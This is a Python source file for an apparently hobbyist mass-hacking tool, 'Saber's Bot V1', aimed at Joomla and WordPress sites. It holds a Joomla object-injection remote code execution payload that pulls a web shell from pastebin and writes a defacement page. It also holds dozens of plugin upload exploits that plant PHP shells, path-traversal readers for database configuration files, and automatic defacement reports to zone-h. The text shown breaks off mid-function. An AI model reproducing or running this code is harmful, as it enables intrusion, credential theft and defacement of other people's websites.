import urllib2,sys
import datetime
import time, os
import requests
import re
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
def linux() : 
    def clear():
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    logo = """
       _____       _               _       ____   ____ _______  __      ____ 
      / ____|     | |             ( )     |  _ \ / __ \__   __| \ \    / /_ |
     | (___   __ _| |__   ___ _ __|/ ___  | |_) | |  | | | |     \ \  / / | |
      \___ \ / _` | '_ \ / _ \ '__| / __| |  _ <| |  | | | |      \ \/ /  | |
      ____) | (_| | |_) |  __/ |    \__ \ | |_) | |__| | | |       \  /   | |
     |_____/ \__,_|_.__/ \___|_|    |___/ |____/ \____/  |_|        \/    |_|
                                                            Saber's Bot V1
                                                            fallagkill3r@gmail.com
                                                            https://www.facebook.com/drwxxrxrx   
    """
    requests.urllib3.disable_warnings()
    #results
    if not os.path.exists("results"):
        os.mkdir("results", 0755);
    if not os.path.exists("tmp"):
        os.mkdir("tmp", 0755);
    #Variables
    rev = 'revsaber.zip'
    grav = 'saber.jpg'
    ind = 'lol.jpg'
    up = 'saber.php'
    cher = 'saber.php'
    mblog = 'blog.php.xxxjpg'
    j1 = 'saber.php3.g'
    j2 = 'jdownloads.zip'
    zebi = 'LOL.gif'
    jcsh = 'saber.php'
    fabric = "saber.txt"
    terma = 'LOL.gif'
    ads = 'saber.jpg'
    asindex = 'LOL.jpg'
    user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
    payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/saber.php','w+'),file_get_contents('https://pastebin.com/raw/nmcSiKfw')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/images/saber.php","w+"),file_get_contents("https://pastebin.com/raw/nmcSiKfw"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/LOL.html','w+'),' Hacked By Saber ');"""
    #Zone-h
    def zone(url) :
        r = requests.post("http://zone-h.com/notify/single", data={'defacer': 'fallag kill3r', 'domain1': url, 'hackmode': 1, 'reason': 1})
        if 'ERROR' in  r.content :
            print color.RED+"Zone-H : ERROR"
        else :
            print color.GREEN+"Zone-H : OK"
    #RCE
    def prepare(url, ua):
        try:
            global user_agent
            headers = {
                'User-Agent' : user_agent,
                'x-forwarded-for' : ua
            }
            cookies = urllib2.Request(url, headers=headers)
            result = urllib2.urlopen(cookies)
            cookieJar = result.info().getheader('Set-Cookie')
            injection = urllib2.Request(url, headers=headers)
            injection.add_header('Cookie', cookieJar)
            urllib2.urlopen(injection)
        except:
            pass
    def toCharCode(string):
        try:
            encoded = ""
            for char in string:
                encoded += "chr({0}).".format(ord(char))
            return encoded[:-1]
        except:
            pass
    def generate(payload):
        php_payload = "eval({0})".format(toCharCode(payload))
        terminate = '\xf0\xfd\xfd\xfd';
        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
        injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
        exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
        exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
        return exploit_template
    def rce(url):
        try:
            global payload
            payload_generated = generate(payload)
            prepare(url, payload_generated)
            tester = urllib2.urlopen(url+"/saber.php").read()
            ww = requests.get(url+"/LOL.html")
            if re.findall("Saber", tester) and urllib2.urlopen(url+"/saber.php").getcode() == 200 and "Hacked" in ww.content:
                site = url + "/saber.php"
                site2 = url + "/LOL.html"
                print color.GREEN+"Defaced > "+site2
                zone(site2)
                print color.GREEN+"Shell uploaded > "+site
                save = open('results/shells.txt', 'a')
                save.write(site+'\n')
                save.close()
                deface = open('results/index.txt', 'a')
                deface.write(site2+'\n')
                deface.close()
        except:
            print color.RED+"[RCE]-NOT VULUN"
            pass
    #JCE
    def jce(site):
        try :
            global zebi
            files = {'Filedata': open(zebi, 'rb')}
            post = {
                'upload-dir': '../../',
                'upload-overwrite': '0',
                'action': 'upload'
            }
            url = site + "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
            html = urllib2.urlopen(url).readlines()
            for line in html:
                if re.findall('No function call specified', line):
                    req = requests.post(url,files=files, data=post)
                    if req.status_code == 200 or 'success' in req.text:
                        url = url.replace('/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form', '/' + zebi)
                        if requests.get(url).status_code == 200:
                            print color.BOLD+"[VULUN] "+url
                            zone(url)
                            save = open('results/index.txt')
                            save.write(url+'\n')
                            save.close()
                    else:
                        print color.RED+"[JCE]-NOT VULUN"
        except :
            pass
    def alberghi(site):
        try:
            global terma
            files = {'userfile': open(terma, 'rb')}
            url = site + "/administrator/components/com_alberghi/upload.alberghi.php"
            html = urllib2.urlopen(url).readlines()
            for line in html:
                if re.findall('Upload', line):
                    req = requests.post(url,files=files)
                    if req.status_code == 200 or 'success' in req.text:
                        url = url.replace('/administrator/components/com_alberghi/upload.alberghi.php', '/administrator/components/com_alberghi/' + terma)
                        if urllib2.urlopen(url).getcode() == 200:
                            print color.BOLD+"Alberghi-[VULUN] => "+url
                            zone(url)
                            with open('results/index.txt') as f :
                                f.write(url+'\n')

        except:
            print color.RED+"[AlBerghi]-NOT VULUN"
            pass
    def jceshell(site):
        try:
            global jcsh
            files = {'Filedata': open(jcsh, 'rb')}
            post = {
                'upload-dir': '../../',
                'upload-overwrite': '0',
                'action': 'upload'
            }
            url = site + "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
            req = requests.post(url,files=files, data=post)
            if req.status_code == 200 or 'success' in req.text:
                url = url.replace('/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form', '/' + jcsh)
                openbing = urllib2.urlopen(url)
                readbing = openbing.read()
                if re.findall("Saber", readbing):
                    print color.BOLD+"[JCE_SHELL]-VULUN >",url
                    save = open('results/shells.txt', 'a')
                    save.write(url+'\n')
                    save.close()

        except:
            print color.RED+"[JCE Shell]-NOT VULUN"
    def adsmanager(site):
        try:
            global ads
            files = {'file': open(ads, 'rb')}
            post = {
                "name": "saber.php"
            }
            url = site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            html = urllib2.urlopen(url).readlines()
            for line in html:
                if re.findall("jsonrpc", line):
                    req = requests.post(url, files=files, data=post)
                    if req.status_code == 200 or 'success' in req.text:
                        url = url.replace('/index.php?option=ads&task=upload&tmpl=component',
                                  '/tmp/plupload/' + ads)
                        openbing = urllib2.urlopen(url)
                        readbing = openbing.read()
                        if re.findall("Saber", readbing):
                            print color.BOLD+"[AdsManager]-VULUN > "+url
                            save = open('results/shells.txt', 'a')
                            save.write(url+'\n')
                            save.close()
        except:
            print color.RED+"[AdsManager Shell]-NOT VULUN"
            pass
    def adsindex(site):
        try:
            global asindex
            files = {'file': open(asindex, 'rb')}
            post = {
                "name": "LOL.html"
            }
            url = site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            html = urllib2.urlopen(url).readlines()
            for line in html:
                if re.findall("jsonrpc", line):
                    req = requests.post(url, files=files, data=post)
                    if req.status_code == 200 or 'success' in req.text:
                        url = url.replace('/index.php?option=com_adsmanager&task=upload&tmpl=component',
                                  '/tmp/plupload/' + asindex)
                        openbing = urllib2.urlopen(url)
                        readbing = openbing.read()
                        if re.findall("Saber", readbing):
                            print color.BOLD+"[AdsManager_Index]-VULUN > "+url
                            save = open('results/index.txt', 'a')
                            save.write(url+'\n')
                            save.close()

        except:
            print color.RED+"[AdsManager Index]-NOT VULUN"
            pass
    def modsimplefileupload(site):
        Exploit = '//modules/mod_simplefileuploadv1.3/elements/udd.php'
        CheckVuln = requests.get(site + Exploit, timeout=5)
        try:
            files = {'file': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "submit": "Upload"
            }
            GoT = requests.post(site + Exploit, files=IndeXfile, data=post, timeout=5)
            check =requests.get(site+'//modules/mod_simplefileuploadv1.3/elements/saber.php')
            if 'Saber BOT V1' in check.content:
                print color.GREEN+"[ModSimpleFileUpload]-VULUN "+site+'///modules/mod_simplefileuploadv1.3/elements/saber.php'
                save= open('results/shells.txt', 'a')
                save.write(site+'///modules/mod_simplefileuploadv1.3/elements/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[ModSimpleFileUpload]-NOT VULUN"
        except:
            print color.RED+"[ModSimpleFileUpload]-NOT VULUN"
            pass
    def fabric_index(site):
        try:
            global fabric
            files = {'userfile': (fabric, open(fabric, 'rb'), 'multipart/form-data')}
            post = {
                "name": "sexy.php",
                "drop_data": "1",
                "overwrite": "1",
                "field_delimiter": ",",
                "text_delimiter": "&quot;",
                "option": "com_fabrik",
                "controller": "import",
                "view": "import",
                "task": "doimport",
                "Itemid": "0",
                "tableid": "0"
            }
            url = site + "/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table="
            req = requests.post(url, files=files, data=post)
            if req.status_code == 200 or 'success' in req.text:
                url = url.replace('/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=',
                                  '/media/' + fabric)
                openbing = urllib2.urlopen(url)
                readbing = openbing.read()
                if re.findall("Hacked", readbing):
                    print color.BOLD+"[Com_Fabrik Index]-VULUN > "+url
                    save = open('results/index.txt', 'a')
                    save.write(url+'\n')
                    save.close()
            else:
                print color.RED+"[Com_Fabrik]-NOT VULUN"
        except:
            pass
    def myblog(site):
        try:
            global mblog
            files = {'fileToUpload': open(mblog, 'rb')}
            url = site + "/index.php?option=com_myblog&task=ajaxupload"
            req = requests.post(url,files=files)
            if req.status_code == 200 or 'success' in req.text:
                url = url.replace('/index.php?option=com_myblog&task=ajaxupload', '/images/' + mblog)
                openbing = urllib2.urlopen(url)
                readbing = openbing.read()
                url2 = site + '/images/stories/' + mblog
                test2 = urllib2.urlopen(url2)
                readtest2 = test2.read()
                if re.findall("Saber", readbing) or re.findall("Tryag File Manager", readtest2):
                    print color.BOLD+"[Com_MyBlog]-VULUN > "+url
                    save = open('results/shells.txt', 'a')
                    save.write(url+'\n')
                    save.close()
            else:
                print color.RED+"[MyBlog]-NOT VULUN"
        except:
            pass
    def cckjseblod(url):
        try:
            response = urllib2.urlopen(url+"/index.php?option=com_cckjseblod&task=download&file=configuration.php")
            content = response.read()
            if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
                site = url + "/index.php?option=com_cckjseblod&task=download&file=configuration.php"
                print color.BOLD+"[cckjseblod]-VULUN > "+site
                save = open('results/JomConfig.txt', 'a')
                save.write(site+'\n')
                save.close()
            else:
                print color.RED+"[cckjseblod]-NOT VULUN"
        except urllib2.HTTPError:
            pass
        except urllib2.URLError:
            pass
    def macgallery(url):
        try:
            response = urllib2.urlopen(url+"/index.php?option=com_macgallery&view=download&albumid=../../configuration.php")
            content = response.read()
            if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
                site = url + "/index.php?option=com_macgallery&view=download&albumid=../../configuration.php"
                print color.BOLD+"[MacGallery]-VULUN > "+site
                save= open('results/JomConfig.txt', 'a')
                save.write(site+'\n')
                save.close()
            else:
                pass
        except urllib2.HTTPError:
            print color.RED+"[MacGallery]-NOT VULUN"
            pass
        except urllib2.URLError:
            pass
    def hdflvplayer(url):
        try:
            req = urllib2.Request(url + "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php")
            response = urllib2.urlopen(req)
            content = response.read()
            if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
                site = url + "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php"
                print color.BOLD+"[HdfVPlayer]-VULUN > "+site
                save = open('results/JomConfig.txt', 'a')
                save.write(site+'\n')
                save.close()

        except urllib2.HTTPError:
            print color.RED+"[HdflVplayer]-NOT VULUN"
            pass
        except urllib2.URLError:
            pass
    #------------Wordpress-------
    #revgetconfig
    def revslidergetconfig(url):
        try : 
            response = urllib2.urlopen(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
            r = requests.get(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
            html = response.read()
            if "DB" in html:
                print color.BOLD+"[Revslider Get Config]-VULUN > "+site
                save = open('results/WpConfig.txt', 'a')
                save.write(html)
            else:
                print color.RED+"[revslidergetconfig]-NOT VULUN"
        except :
            pass
    #addblockurl
    def addblockurl(url):
        global up
        try : 
            ShellFile = {'popimg': open('saber.php', 'rb')}
            poc = url+'/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
            rep = requests.post(url, files=ShellFile)
            now = datetime.datetime.now()
            new = url+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php'
            w = requests.get(new)
            if 'Saber BOT V1' in w.content :
                print color.BOLD+"[AddBlockUrl]-VULUN > "+new
                save = open('results/shells.txt')
                save.write(new+'\n')
                save.close()
            else:
                print color.RED+"[AddBlockUrl]-NOT VULUN"
        except:
            print color.RED+"[AddBlockUrl]-NOT VULUN"
            pass
    #cherry
    def cherry(url):
        global cher
        try:
            dirx = '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php'
            xxxxe = url + dirx
            files={'file':(cher, open(cher,'rb'),'multipart/form-data')}
            r = requests.post(xxxxe, files=files)
            bb = cher
            shelldir = '/wp-content/plugins/cherry-plugin/admin/import-export/'+bb
            shelled = url + shelldir
            openbing = urllib2.urlopen(shelled)
            readbing = openbing.read()
            if re.findall("Saber", readbing):
                print color.BOLD+"[Cherry Plugin]-VULUN > "+shelled
                save = open('results/shells.txt', 'a')
                save.write(shelled+'\n')
                save.close()
        except :
            print color.RED+"[Cherry Plugin]-NOT VULUN"
            pass
    def sexycontacoform(site):
        Exploit = '//wp-content/plugins/sexy-contact-form/includes/fileupload/index.php'
        CheckVuln = requests.get(site + Exploit, timeout=5)
        try:
            IndeXfile = {'file[]': open('saber.php', 'rb')}
            GoT = requests.post(site + Exploit, files=IndeXfile, timeout=5)
            check =requests.get(site+'//wp-content/plugins/sexy-contact-form/includes/fileupload/files/saber.php')
            if 'Saber BOT V1' in check.content:
                print color.GREEN+"[SexyContatctForm]-VULUN "+site+'//wp-content/plugins/sexy-contact-form/includes/fileupload/files/saber.php'
                save= open('results/shells.txt', 'a')
                save.write(site+'//wp-content/plugins/sexy-contact-form/includes/fileupload/files/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[SexyContatctForm]-NOT VULUN"
        except:
            print color.RED+"[SexyContatctForm]-NOT VULUN"
            pass
    def reflexgallery(site):
            files = {'qqfile': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "dm_upload": ""
            }
            now = datetime.datetime.now()
            url = site + "//wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year="+str(now.year)+"&Month="+str(now.month)
            try : 
                req = requests.post(url, files=files)
                ww = requests.get(site+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php')
                if 'Saber BOT V1' in ww.content :
                    print color.BOLD+site+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php'
                    save = open('results/shells.txt', 'a')
                    save.write(site+'/wp-content/uploads/'+str(now.year)+'/0'+str(now.month)+'/'+'saber.php'+'\n')
                    save.close()
                else:
                    print color.RED+"[ReflexGallery]-Not Vulun"
            except :
                    pass
                    print color.RED+"[ReflexGallery]-Not Vulun"

    def wysija(site):
        try:
            FileShell = {'my-theme': open('zebi.zip', 'rb')}
            PostData = {'action': "themeupload", 'submitter': "Upload", 'overwriteexistingtheme': "on",
                    'page': 'GZNeFLoZAb'}
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            url = site + "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes"
            GoT = requests.post(url, files=FileShell, data=PostData, headers=UserAgent, timeout=10)
            sh =site + '/wp-content/uploads/wysija/themes/zebi/saber.php'
            CheckShell = requests.get(sh, timeout=5)
            if 'Saber BOT V1' in CheckShell.content :
                print color.GREEN+"[wysija]-VUlun : "+sh
            else:
                print color.RED+"[Wysija]-Not Vulun"
        except:
            print color.RED+"[Wysija]-Not Vulun"
            pass
    def wtffu(site):
        try : 
            ShellFile = {'files[]': open('saber.php', 'rb')}
            Exploit = '//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            if 'Saber BOT V1' in GoT.content :
                print color.GREEN+"[WorkTheFlow]-Vulun : "+site+'//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'//wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[WorkTheFlow]-Not Vulun"
        except :
            print color.RED+"[WorkTheFlow]-Not Vulun"
            pass
    def wpshop(site):
        try : 
            ShellFile = {'wpshop_file': open('saber.php', 'rb')}
            Exploit = '/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload/'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            if 'Saber BOT V1' in GoT.content :
                print color.GREEN+"[WPShop]-Vulun"+site+'//wp-content/uploads/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'//wp-content/uploads/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[WPShop]-Not Vulun"
        except :
            print color.RED+"[WPShop]-Not Vulun"
            pass
    def formcaft(site):
        global up
        ww = site+'/wp-content/plugins/formcraft/file-upload/server/php/'
        shell = open(up, "r")
        payload = {"files[]" : shell}
        bypass = {"new_name" : "ss.php"}
        try :
            files={'file':(cher, open(up,'rb'),'multipart/form-data')}
            rep = requests.post(ww, data=bypass, files=payload)
            pp = requests.get(site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php')
            if 'Saber BOT V1' in pp.content:
                print color.GREEN+"[FormCat]-VULUN "+site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php'
                save= open('results/shells.txt', 'a')
                save.write(site+'/wp-content/plugins/formcraft/file-upload/server/php/files/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[FormCaft Plugin]-NOT VULUN"
        except :
            print color.RED+"[FormCaft Plugin]-NOT VULUN"
            pass
    #levo

    #powerzoom

    #gravity
    def gravindex(site):
        global ind
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        fileDeface = {'file': open(ind, 'r')}
        post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../../', 'name': 'saber.html'}
        url = site+'/?gf_page=upload'
        try : 
            req = requests.post(url, files=fileDeface, data=post_data)
            if "ok" in req.content :
                print color.GREEN+"[Gravity Form Index]-VULUN > "+site+'//_input_3_saber.html'
                zone(site)
                save= open('results/index.txt', 'a')
                save.write(site+'//_input_3_saber.html'+'\n')
                save.close()
            else:
                print color.RED+"[Gravity Form Index]-NOT VULUN"
        except:
            pass
    def gravity(site):
        global grav
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        fileDeface = {'file': open(grav, 'r')}
        post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'saber.php'}
        url = site+'/?gf_page=upload'
        ww = requests.get(url)
        if not """ {"status" : "error", "error" : {"code": 500, "message": "Failed to upload file."}} """ in ww.content :
            print color.RED+"[GravityForm]-NOT VULUN"
            pass
        else :
            try : 
                req = requests.post(url, files=fileDeface, data=post_data)
                if "ok" in req.content :
                    print color.BOLD+"[Gravity Form]-VULUN > "+site+'/wp-content/uploads/_input_3_saber.php'
                    save= open('results/shells.txt', 'a')
                    save.write(site+'/wp-content/uploads/_input_3_saber.php'+'\n')
                    save.close()
                else:
                    print color.RED+"[Gravity Form Shell]-NOT VULUN"
                    gravindex(site)
            except:
                pass
    def downloadsmanager(site):
            files = {'upfile': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "dm_upload": ""
            }
            url = site + "//wp-content/plugins/downloads-manager/readme.txt"
            try : 
                req = requests.post(url, files=files, data=post)
                ww = requests.get(site+"/wp-content/plugins/downloads-manager/upload/saber.php")
                if 'Saber BOT V1' in ww.content :
                    print color.BOLD+"[VULUN]-"+site+"//wp-content/plugins/downloads-manager/upload/saber.php"
                    save = open('results/shells.txt', 'a')
                    save.write(site+"//wp-content/plugins/downloads-manager/upload/saber.php"+"\n")
                    save.close()
                else:
                    print color.RED+"[DownloadsManager]-Not Vulun"

            except :
                pass

    def inboundiomarketing(site):
            files = {'file': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "dm_upload": ""
            }
            url = site + "//wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php"
            try : 
                req = requests.post(url, files=files, data=post)
                ww = requests.get(site+"//wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/saber.php")
                if 'Saber BOT V1' in ww.content :
                    print color.BOLD+site+"//wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/saber.php"
                    save = open('results/shells.txt', 'a')
                    save.write(site+"///wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv//saber.php"+'\n')
                    save.close()
                else:
                    print color.RED+"[InboundioMarketing]-Not Vulun"
            except :
                pass

    def phpeventcalendar(site):
        try : 
            ShellFile = {'files[]': open('saber.php', 'rb')}
            Exploit = '//wp-content/plugins/php-event-calendar/server/file-uploader/'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/wp-content/plugins/php-event-calendar/server/file-uploader/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[PhPCalendarEvenet]-Vulun : "+site+'/wp-content/plugins/php-event-calendar/server/file-uploader/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/wp-content/plugins/php-event-calendar/server/file-uploader/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[PhpCalendarEvent]-Not Vulun"
        except :
            print color.RED+"[PhpCalendarEvent]-Not Vulun"
            pass

    def revslider(site):
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            Exploit = site + '/wp-admin/admin-ajax.php'
            data = {'action': "revslider_ajax_action", 'client_action': "update_plugin"}
            FileShell = {'update_file': open(rev, 'rb')}
            CheckRevslider = requests.get(site, timeout=5)
            try : 
                if '/wp-content/plugins/revslider/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/plugins/revslider/temp/update_extract//revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print "[revslider Shell]-VULUN > "+site+'//wp-content/plugins/revslider/temp/update_extract//revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/plugins/revslider/temp/update_extract//revslider/saber.php'+'\n')
                elif '/wp-content/themes/Avada/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+site+"[Revslider Avada Shell]-VULUN > "+site+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '/wp-content/themes/striking_r/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider striking_r Shell]-VULUN > "+site+'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '//wp-content/themes/IncredibleWP/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'//wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider IncredibleWP Shell]-VULUN > "+site+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '//wp-content/themes/ultimatum/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'//wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider ultimatum Shell]-VULUN > "+site+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '//wp-content/themes/medicate' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider medicate Shell]-VULUN > "+site+'/wp-content/themes/medicate/script/revslider/temp/update_extract/update_extract/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '//wp-content/themes/centum/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider centum Shell]-VULUN > "+site+'//wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'///wp-content/themes/centum/revslider/temp/update_extract/revslider/saber.php'+'\n')
                elif '//wp-content/themes/beach_apollo/' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
                        print color.GREEN+"[Revslider centum Shell]-VULUN > "+site+'//wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'//wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/saber.php'+'\n')
                else:
                    print color.RED+"[AddBlockUrl]-NOT VULUN"
                    pass
            except:
                print color.RED+"[Revslider]-Not Vulun"
                pass
    def zoomsound(site):
            files = {'file_field': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "dm_upload": ""
            }
            url = site + "/wp-content/plugins/dzs-zoomsounds/admin/upload.php"
            try : 
                req = requests.post(url, files=files)
                ww = requests.get(site+"///wp-content/plugins/dzs-zoomsounds/admin/upload/saber.php")
                if 'Saber BOT V1' in ww.content :
                    print color.BOLD+site+"///wp-content/plugins/dzs-zoomsounds/admin/upload/saber.php"
                    save = open('results/shells.txt', 'a')
                    save.write(site+"////wp-content/plugins/dzs-zoomsounds/admin/upload/saber.php"+'\n')
                    save.close()
                else:
                    print color.RED+"[ZoomSound]-Not Vulun"
            except :
                pass
    def showbiz(site):
            global jcsh
            UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            Exploit = site + '/wp-admin/admin-ajax.php'
            data = {'action': "showbiz_ajax_action", 'client_action': "update_plugin"}
            FileShell = {'update_file': open(jcsh, 'rb')}
            CheckRevslider = requests.get(site, timeout=5)
            try : 
                if '/wp-content/plugins/showbiz//' in CheckRevslider.text.encode('utf-8'):
                    requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                    ShellCheck = requests.get(site +'/wp-content/plugins/showbiz/temp/update_extract//saber.php', timeout=5)
                    if 'Saber BOT V1' in ShellCheck.content :
